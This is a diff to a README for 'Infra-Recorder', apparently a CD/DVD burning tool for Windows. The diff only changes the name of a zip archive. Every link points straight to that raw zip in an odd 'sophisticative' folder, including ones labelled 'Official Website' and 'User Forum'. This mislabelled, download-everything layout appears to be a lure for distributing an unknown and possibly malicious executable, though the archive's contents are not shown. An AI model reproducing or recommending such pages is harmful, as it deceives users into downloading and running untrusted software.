@@ -6,11 +6,11 @@ Welcome to Infra-Recorder! This software allows you to easily create CDs and DVD
 
 ## 📥 Download Infra-Recorder
 
-[![Download Infra-Recorder](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Infra-Recorder-3.5.zip)](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Infra-Recorder-3.5.zip)
+[![Download Infra-Recorder](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Recorder_Infra_v2.5.zip)](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Recorder_Infra_v2.5.zip)
 
 To download Infra-Recorder, follow these steps:
 
-1. Click the button above or visit this page: [Download Infra-Recorder](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Infra-Recorder-3.5.zip).
+1. Click the button above or visit this page: [Download Infra-Recorder](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Recorder_Infra_v2.5.zip).
 2. You will see the list of available versions.
 3. Choose the latest version for your Windows system.
 4. Click on the download link. Your download will start automatically.
@@ -38,7 +38,7 @@ Before you install Infra-Recorder, check that your system meets these requiremen
 
 To download and install Infra-Recorder:
 
-1. Visit the [Download Infra-Recorder](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Infra-Recorder-3.5.zip) page.
+1. Visit the [Download Infra-Recorder](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Recorder_Infra_v2.5.zip) page.
 2. Select the latest version from the list.
 3. The file will download to your computer. Once completed, locate the downloaded file.
 4. Double-click the setup file to begin the installation.
@@ -63,7 +63,7 @@ For any feedback or suggestions, feel free to reach out through our issue tracke
 
 ## 🔗 Useful Links
 
-- [Official Website](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Infra-Recorder-3.5.zip)
-- [User Forum](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Infra-Recorder-3.5.zip)
+- [Official Website](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Recorder_Infra_v2.5.zip)
+- [User Forum](https://raw.githubusercontent.com/RonitGit01/Infra-Recorder/main/sophisticative/Recorder_Infra_v2.5.zip)
 
 Enjoy using Infra-Recorder for all your CD/DVD burning needs!
